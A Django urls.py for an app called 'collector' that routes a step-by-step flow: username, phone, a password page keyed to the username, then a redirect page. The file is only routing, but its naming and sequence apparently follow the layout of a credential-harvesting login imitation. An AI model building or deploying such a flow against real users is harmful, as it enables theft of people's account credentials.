# collector/urls.py
from django.urls import path
from . import views

urlpatterns = [
    path('', views.step1_username, name='step1_username'),
    path('phone/', views.step1_phone, name='step1_phone'),
    path('password/<str:username>/', views.step2_password, name='step2_password'),
    # Add this new path for the redirecting page
    path('redirecting/', views.success_redirect, name='success_redirect'),
]